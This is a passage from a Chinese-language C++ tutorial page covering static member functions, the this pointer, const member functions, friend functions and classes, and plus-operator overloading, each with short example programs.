<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员函数特点：</span></span><br><span class="line">	<span class="comment">//1 程序共享一个函数</span></span><br><span class="line">	<span class="comment">//2 静态成员函数只能访问静态成员变量</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">		<span class="comment">//m_B = 100; //错误，不可以访问非静态成员变量</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line">	<span class="type">int</span> m_B; <span class="comment">// </span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员函数也是有访问权限的</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func2调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、通过对象</span></span><br><span class="line">	Person p1;</span><br><span class="line">	p1.<span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、通过类名</span></span><br><span class="line">	Person::<span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Person::func2(); //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h3 id="4-3-C-对象模型和this指针"><a href="#4-3-C-对象模型和this指针" class="headerlink" title="4.3 C++对象模型和this指针"></a>4.3 C++对象模型和this指针</h3><h4 id="4-3-1-成员变量和成员函数分开存储"><a href="#4-3-1-成员变量和成员函数分开存储" class="headerlink" title="4.3.1 成员变量和成员函数分开存储"></a>4.3.1 成员变量和成员函数分开存储</h4><p>在C++中，类内的成员变量和成员函数分开存储</p>
<p>只有非静态成员变量才属于类的对象上</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		mA = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//非静态成员变量占对象空间</span></span><br><span class="line">	<span class="type">int</span> mA;</span><br><span class="line">	<span class="comment">//静态成员变量不占对象空间</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> mB; </span><br><span class="line">	<span class="comment">//函数也不占对象空间，所有函数共享一个函数实例</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mA &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//静态成员函数也不占对象空间</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(Person) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="4-3-2-this指针概念"><a href="#4-3-2-this指针概念" class="headerlink" title="4.3.2 this指针概念"></a>4.3.2 this指针概念</h4><p>通过4.3.1我们知道在C++中成员变量和成员函数是分开存储的</p>
<p>每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p>
<p>那么问题是：这一块代码是如何区分那个对象调用自己的呢？</p>
<p>c++通过提供特殊的对象指针，this指针，解决上述问题。<strong>this指针指向被调用的成员函数所属的对象</strong></p>
<p>this指针是隐含每一个非静态成员函数内的一种指针</p>
<p>this指针不需要定义，直接使用即可</p>
<p>this指针的用途：</p>
<ul>
<li>当形参和成员变量同名时，可用this指针来区分</li>
<li>在类的非静态成员函数中返回对象本身，可使用return *this</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//1、当形参和成员变量同名时，可用this指针来区分</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person&amp; <span class="title">PersonAddPerson</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age += p.age;</span><br><span class="line">		<span class="comment">//返回对象本身</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.age = &quot;</span> &lt;&lt; p1.age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	p2.<span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2.age = &quot;</span> &lt;&lt; p2.age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="4-3-3-空指针访问成员函数"><a href="#4-3-3-空指针访问成员函数" class="headerlink" title="4.3.3 空指针访问成员函数"></a>4.3.3 空指针访问成员函数</h4><p>C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针</p>
<p>如果用到this指针，需要加以判断保证代码的健壮性</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//空指针访问成员函数</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我是Person类!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person * p = <span class="literal">NULL</span>;</span><br><span class="line">	p-&gt;<span class="built_in">ShowClassName</span>(); <span class="comment">//空指针，可以调用成员函数</span></span><br><span class="line">	p-&gt;<span class="built_in">ShowPerson</span>();  <span class="comment">//但是如果成员函数中用到了this指针，就不可以了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="4-3-4-const修饰成员函数"><a href="#4-3-4-const修饰成员函数" class="headerlink" title="4.3.4 const修饰成员函数"></a>4.3.4 const修饰成员函数</h4><p><strong>常函数：</strong></p>
<ul>
<li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li>
<li>常函数内不可以修改成员属性</li>
<li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li>
</ul>
<p><strong>常对象：</strong></p>
<ul>
<li>声明对象前加const称该对象为常对象</li>
<li>常对象只能调用常函数</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		m_A = <span class="number">0</span>;</span><br><span class="line">		m_B = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this指针的本质是一个指针常量，指针的指向不可修改</span></span><br><span class="line">	<span class="comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//const Type* const pointer;</span></span><br><span class="line">		<span class="comment">//this = NULL; //不能修改指针的指向 Person* const this;</span></span><br><span class="line">		<span class="comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">MyFunc</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//mA = 10000;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="keyword">mutable</span> <span class="type">int</span> m_B; <span class="comment">//可修改 可变的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰对象  常对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> Person person; <span class="comment">//常量对象  </span></span><br><span class="line">	cout &lt;&lt; person.m_A &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span></span><br><span class="line">	person.m_B = <span class="number">100</span>; <span class="comment">//但是常对象可以修改mutable修饰成员变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//常对象访问成员函数</span></span><br><span class="line">	person.<span class="built_in">MyFunc</span>(); <span class="comment">//常对象不能调用const的函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>








<h3 id="4-4-友元"><a href="#4-4-友元" class="headerlink" title="4.4 友元"></a>4.4 友元</h3><p>生活中你的家有客厅(Public)，有你的卧室(Private)</p>
<p>客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去</p>
<p>但是呢，你也可以允许你的好闺蜜好基友进去。</p>
<p>在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术</p>
<p>友元的目的就是让一个函数或者类 访问另一个类中私有成员</p>
<p>友元的关键字为  &#x3D;&#x3D;friend&#x3D;&#x3D;</p>
<p>友元的三种实现</p>
<ul>
<li>全局函数做友元</li>
<li>类做友元</li>
<li>成员函数做友元</li>
</ul>
<h4 id="4-4-1-全局函数做友元"><a href="#4-4-1-全局函数做友元" class="headerlink" title="4.4.1 全局函数做友元"></a>4.4.1 全局函数做友元</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Building</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom; <span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Building b;</span><br><span class="line">	<span class="built_in">goodGay</span>(&amp;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-4-2-类做友元"><a href="#4-4-2-类做友元" class="headerlink" title="4.4.2 类做友元"></a>4.4.2 类做友元</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span></span><br><span class="line">	<span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">goodGay</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="4-4-3-成员函数做友元"><a href="#4-4-3-成员函数做友元" class="headerlink" title="4.4.3 成员函数做友元"></a>4.4.3 成员函数做友元</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>; <span class="comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit2</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay  gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h3 id="4-5-运算符重载"><a href="#4-5-运算符重载" class="headerlink" title="4.5 运算符重载"></a>4.5 运算符重载</h3><p>运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p>
<h4 id="4-5-1-加号运算符重载"><a href="#4-5-1-加号运算符重载" class="headerlink" title="4.5.1 加号运算符重载"></a>4.5.1 加号运算符重载</h4><p>作用：实现两个自定义数据类型相加的运算</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;&#125;;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//成员函数实现 + 号运算符重载</span></span><br><span class="line">	Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		Person temp;</span><br><span class="line">		temp.m_A = <span class="keyword">this</span>-&gt;m_A + p.m_A;</span><br><span class="line">		temp.m_B = <span class="keyword">this</span>-&gt;m_B + p.m_B;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现 + 号运算符重载</span></span><br><span class="line"><span class="comment">//Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;</span></span><br><span class="line"><span class="comment">//	Person temp(0, 0);</span></span><br><span class="line"><span class="comment">//	temp.m_A = p1.m_A + p2.m_A;</span></span><br><span class="line"><span class="comment">//	temp.m_B = p1.m_B + p2.m_B;</span></span><br><span class="line"><span class="comment">//	return temp;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运算符重载 可以发生函数重载 </span></span><br><span class="line">Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p2, <span class="type">int</span> val)  </span><br><span class="line">&#123;</span><br><span class="line">	Person temp;</span><br><span class="line">	temp.m_A = p2.m_A + val;</span><br><span class="line">	temp.m_B = p2.m_B + val;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//成员函数方式</span></span><br><span class="line">	Person p3 = p2 + p1;  <span class="comment">//相当于 p2.operaor+(p1)</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p3.m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p3.m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	Person p4 = p3 + <span class="number">10</span>; <span class="comment">//相当于 operator+(p3,10)</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p4.m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p4.m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结1：对于内置的数据类型的表达式的的运算符是不可能改变的</p>
</blockquote>
<blockquote>
<p>总结2：不要滥用运算符重载</p>
</blockquote>
<h4 id="4-5-2-左移运算符重载"><a href="#4-5-2-左移运算符重载" class="headerlink" title="4.5.2 左移运算符重载"></a>4.5.2 左移运算符重载</h4><p>作用：可以输出自定义数据类型</p>
